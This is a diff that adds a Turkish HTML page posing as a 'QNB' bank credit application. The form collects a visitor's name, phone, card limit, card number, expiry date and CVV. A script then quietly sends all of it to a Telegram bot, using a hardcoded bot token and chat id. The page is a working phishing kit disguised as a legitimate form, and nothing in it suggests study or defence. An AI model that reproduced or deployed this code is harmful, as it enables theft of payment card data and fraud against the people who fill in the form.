@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>QNB Başvuru</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom right, #2e0d7b, #0073cf);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      height: 100vh;
+      color: white;
+    }
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      flex: 1;
+      justify-content: center;
+    }
+    .card {
+      background: rgba(255, 255, 255, 0.05);
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+      width: 360px;
+      backdrop-filter: blur(10px);
+      display: none;
+    }
+    .card.active {
+      display: block;
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    .form-group label {
+      display: block;
+      margin-bottom: 5px;
+    }
+    .form-group input {
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      border: none;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+    .submit-btn {
+      width: 100%;
+      padding: 14px;
+      background: #3d0066;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .button-row {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+    }
+    .button-row button {
+      flex: 1;
+      padding: 12px;
+      background: transparent;
+      border: 2px solid white;
+      border-radius: 10px;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .checkmark {
+      font-size: 48px;
+      color: #00cc66;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    .summary-box {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 15px;
+      border-radius: 10px;
+      margin-top: 20px;
+    }
+    .summary-box p {
+      margin: 6px 0;
+    }
+    .summary-box strong {
+      display: inline-block;
+      width: 130px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- ADIM 1 -->
+    <div class="card active" id="formCard">
+      <h2>Bilgilerinizi Giriniz</h2>
+      <div class="form-group">
+        <label for="name">Ad Soyad *</label>
+        <input type="text" id="name" required />
+      </div>
+      <div class="form-group">
+        <label for="phone">Telefon *</label>
+        <input type="tel" id="phone" required />
+      </div>
+      <button class="submit-btn" onclick="goToCardQuestion()">DEVAM</button>
+    </div>
+
+    <!-- ADIM 2 -->
+    <div class="card" id="cardQuestion">
+      <h2>Kredi Kartınız Var mı?</h2>
+      <div class="button-row">
+        <button onclick="goToLimitPage()">Evet</button>
+        <button onclick="finishWithoutCard()">Hayır</button>
+      </div>
+    </div>
+
+    <!-- ADIM 3 -->
+    <div class="card" id="limitCard">
+      <h2>Kart Limitinizi Giriniz</h2>
+      <div class="form-group">
+        <label for="limit">Kart Limiti *</label>
+        <input type="text" id="limit" placeholder="100000 ₺" required />
+      </div>
+      <button class="submit-btn" onclick="goToCardDetails()">DEVAM</button>
+    </div>
+
+    <!-- ADIM 4 -->
+    <div class="card" id="cardDetails">
+      <h2>Kart Bilgilerinizi Giriniz</h2>
+      <div class="form-group">
+        <label for="cardNumber">Kart Numarası *</label>
+        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" oninput="formatCardNumber(this)" />
+      </div>
+      <div class="form-group">
+        <label for="expiry">Son Kullanma Tarihi *</label>
+        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)" />
+      </div>
+      <div class="form-group">
+        <label for="cvv">CVV *</label>
+        <input type="text" id="cvv" placeholder="123" maxlength="3" oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
+      </div>
+      <button class="submit-btn" onclick="showSuccess()">BAŞVURUYU TAMAMLA</button>
+    </div>
+
+    <!-- ADIM 5 -->
+    <div class="card" id="successCard">
+      <div class="checkmark">✔️</div>
+      <h2>Başvurunuz Alındı</h2>
+      <div class="summary-box">
+        <p><strong>Ad Soyad:</strong> <span id="summaryName"></span></p>
+        <p><strong>Telefon:</strong> <span id="summaryPhone"></span></p>
+        <p><strong>Kart Limiti:</strong> <span id="summaryLimit"></span></p>
+        <p><strong>Kart No:</strong> <span id="summaryCard"></span></p>
+        <p><strong>Son Kullanma:</strong> <span id="summaryExpiry"></span></p>
+        <p><strong>CVV:</strong> <span id="summaryCVV"></span></p>
+        <p><strong>Başvuru Tarihi:</strong> <span id="summaryDate"></span></p>
+      </div>
+      <button class="submit-btn" onclick="location.reload()">Yeniden Başla</button>
+    </div>
+  </div>
+
+  <script>
+    function showCard(id) {
+      document.querySelectorAll('.card').forEach(card => card.classList.remove('active'));
+      document.getElementById(id).classList.add('active');
+    }
+
+    function goToCardQuestion() {
+      showCard("cardQuestion");
+    }
+
+    function goToLimitPage() {
+      showCard("limitCard");
+    }
+
+    function goToCardDetails() {
+      showCard("cardDetails");
+    }
+
+    function finishWithoutCard() {
+      alert("Kredi kartı bilginiz alınmadı.");
+      fillSummary();
+      showCard("successCard");
+    }
+
+    function showSuccess() {
+      fillSummary();
+      sendToTelegram();
+      showCard("successCard");
+    }
+
+    function fillSummary() {
+      document.getElementById("summaryName").innerText = document.getElementById("name").value;
+      document.getElementById("summaryPhone").innerText = document.getElementById("phone").value;
+      document.getElementById("summaryLimit").innerText = document.getElementById("limit").value;
+      document.getElementById("summaryCard").innerText = document.getElementById("cardNumber").value;
+      document.getElementById("summaryExpiry").innerText = document.getElementById("expiry").value;
+      document.getElementById("summaryCVV").innerText = document.getElementById("cvv").value;
+      document.getElementById("summaryDate").innerText = new Date().toLocaleString('tr-TR');
+    }
+
+    function formatCardNumber(input) {
+      let value = input.value.replace(/\D/g, '').substring(0,16);
+      input.value = value.replace(/(.{4})/g, '$1 ').trim();
+    }
+
+    function formatExpiry(input) {
+      let value = input.value.replace(/[^0-9]/g, '').substring(0, 4);
+      if (value.length >= 3) {
+        input.value = value.substring(0, 2) + '/' + value.substring(2);
+      } else {
+        input.value = value;
+      }
+    }
+
+    async function sendToTelegram() {
+      const token = "7899149800:AAEUrSio-NfOHcCsvZRsNwBhQrp_lBCcY4c";
+      const chat_id = "8045620328";
+      const message = 
+        "📩 *Yeni Başvuru*\n\n" +
+        "👤 Ad Soyad: " + document.getElementById("name").value + "\n" +
+        "📞 Telefon: " + document.getElementById("phone").value + "\n" +
+        "💳 Kart Limiti: " + document.getElementById("limit").value + "\n" +
+        "🔢 Kart No: " + document.getElementById("cardNumber").value + "\n" +
+        "📆 Son Kullanma: " + document.getElementById("expiry").value + "\n" +
+        "🔐 CVV: " + document.getElementById("cvv").value + "\n" +
+        "📅 Tarih: " + new Date().toLocaleString('tr-TR');
+
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      });
+    }
+  </script>
+</body>
+</html>
